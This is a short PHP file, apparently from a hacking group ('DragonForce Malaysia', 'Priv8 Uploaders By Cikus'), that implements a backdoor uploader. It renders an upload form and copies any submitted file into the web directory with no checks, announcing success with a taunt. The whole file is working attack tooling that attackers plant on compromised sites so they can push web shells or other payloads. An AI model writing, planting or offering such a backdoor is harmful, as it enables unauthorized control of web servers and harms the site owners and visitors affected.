<title>DragonForce Malaysia!</title>
<?php
echo '<center><h1>Priv8 Uploaders By Cikus!</h1><form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">';
echo '<input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upload"></form>';
if( $_POST['_upl'] == "Upload" ) {
if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo '<b>Fuckedz!</b><br><br>'; }
else { echo '<b>Failed!</b><br><br>'; }
}
?>
